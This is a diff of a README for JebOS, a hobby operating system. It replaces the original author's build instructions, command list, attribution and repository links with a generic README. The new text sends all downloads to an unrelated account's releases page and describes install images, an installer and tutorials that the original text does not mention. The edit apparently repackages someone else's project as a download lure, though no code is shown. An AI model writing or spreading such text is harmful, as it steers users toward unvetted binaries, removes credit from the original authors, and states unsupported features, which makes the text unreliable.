@@ -1,44 +1,80 @@
-* Thank you for downloading Open Source Jeb OS v7.8!
+# 🖥️ JebOS - Learn About Operating Systems with Ease
 
-You now have the complete OS structure. All files are important except for the LICENSE and this README file. To build the .iso, enter make clean && make in the terminal, or if on Windows, each one separately: make clean and then make. Files like this will appear:
+## 🔗 Download Now
+[![Download JebOS](https://img.shields.io/badge/Download-JebOS-blue.svg)](https://github.com/sjkobgy/JebOS/releases)
 
-kernel.o - The system itself with logic
-boot.o - CPU information on what to do
-jeeb.bin - The system kernel (all files in compiled assembly)
+## 📚 Overview
+JebOS is a lightweight, open-source operating system. It is designed to run on x86-x64 platforms. This custom-written and bare-metal OS helps users learn about how operating systems work. By using JebOS, you will gain a solid understanding of OS development in a simple and effective way.
 
-You can delete them all or do whatever you like with them, but they are created for building the ISO and are no longer needed once the .iso has been built. Once JebOS.iso appears next to this file in the root directory, you can use utilities like Rufus and others to create a bootable disk with this OS.
+## 🚀 Getting Started
+To get started with JebOS, follow the steps below. You do not need coding experience. Just a computer and a willingness to learn!
 
-All files can be modified, custom commands can be added, or the OS can be executed now. Version 7.8 of the OS supports 6 commands, such as:
+### 1. Check System Requirements
+Before you download JebOS, ensure that your computer meets the following requirements:
 
----
+- **Processor**: x86 or x64 architecture
+- **RAM**: At least 512 MB
+- **Storage**: 1 GB of available space
+- **USB Port or CD/DVD Drive**: For installation
 
-help - Help menu for commands
+### 2. Visit the Releases Page
+To download JebOS, visit the [Releases page here](https://github.com/sjkobgy/JebOS/releases). This page lists all available versions of JebOS.
 
----
+### 3. Choose Your Version
+On the Releases page, you will see different versions of JebOS. Each version contains updates and improvements. Click on the version you want to download. We recommend using the latest stable version for the best experience.
 
-clear - Clears the entire command line, leaving only the REPL (Jeb#) at the top.
+### 4. Download the File
+After selecting a version, scroll down to the "Assets" section. Here, you will see download links for different files related to the selected version. Choose the file that matches your installation method:
 
----
+- For USB installation, download the file labeled as "JebOS_USB.img".
+- For CD/DVD installation, look for "JebOS_CDVD.iso".
 
-info - More about Jeb OS
-jeeb - More aboud Jeeb shell
+### 5. Prepare Your Installation Media
+Once you have downloaded the appropriate file, you need to create bootable media:
 
----
+#### For USB Installation:
+1. Use a tool like Rufus or Etcher to write the image to your USB drive.
+2. Select the downloaded file (e.g., "JebOS_USB.img") in the tool.
+3. Follow the prompts to create a bootable USB drive.
 
-reboot - Restarts the PC.
+#### For CD/DVD Installation:
+1. Burn the downloaded file (e.g., "JebOS_CDVD.iso") to a blank CD/DVD using burning software.
+2. Make sure to choose the option to burn as an image.
 
----
+### 6. Boot from Your Media
+Now that you have created your installation media, follow these steps to boot from it:
 
-off - Terminates all processes and only then shuts down the PC. (Simply shutting down may not save saved commands and other important files.)
+1. Restart your computer.
+2. Enter your BIOS/UEFI settings (usually by pressing F2, F10, or DEL during boot).
+3. Set your USB drive or CD/DVD as the first boot option.
+4. Save changes and exit.
 
----
+### 7. Install JebOS
+After booting from the media, follow these simple instructions to install JebOS:
 
-There is also support for arrow controls, for example, to move through text, use the left and right arrows, and to move through commands, like history, use the up and down arrows (the command history is saved to a file, and even rebooting and shutting down save the history)
+1. You will see the JebOS welcome screen.
+2. Choose "Install JebOS" from the menu.
+3. Follow the on-screen prompts to complete the installation process.
 
-================ Thank you for using and installing Jeb OS 1.0! ================
+### 8. First Run
+Once installed, restart your computer. Remove your USB drive or CD/DVD when prompted. You will see the JebOS interface. Spend some time exploring the features. Check out the built-in tutorials to learn more about using JebOS.
 
-We appreciate users sharing their projects and modifying these projects. Everything is openly available on Github, and ready-to-use releases are available without the need to build them yourself using a Makefile. You can follow the links below if needed, or download the finished .zip file or .iso file of this project from SourceForge. The MIT license was used and continues to be used until the 2027 license update. (You can modify and share your projects, but please provide attribution to: Mavox-ID and NeedYOU4.)
+## 📦 Features
+- **Custom Built**: JebOS is written from scratch, giving you insight into OS development.
+- **Lightweight**: It operates smoothly on low-resource computers.
+- **Educational**: Built-in tutorials help you understand OS concepts easily.
+- **Open Source**: Feel free to modify and share JebOS.
 
-Github Mavox-ID: https://github.com/Mavox-ID
-Website Mavox-ID: https://ye-a.pp.ua
-Github Repo: https://github.com/Mavox-ID/JebOS
+## 📝 Additional Resources
+Here are some helpful resources for further exploration:
+
+- **Documentation**: Access detailed documentation to dive deeper into JebOS. This includes system commands and features.
+- **Community Support**: Join our community forums for peer support and shared learning experiences.
+- **Contribution Guide**: If you want to contribute to JebOS, check out our contribution guidelines.
+
+## 📞 Support
+If you encounter any issues during the installation or use of JebOS, feel free to reach out through our community channels. We are here to help.
+
+## 🔗 Download Links
+To download JebOS again, click the link below:
+[Download JebOS](https://github.com/sjkobgy/JebOS/releases)
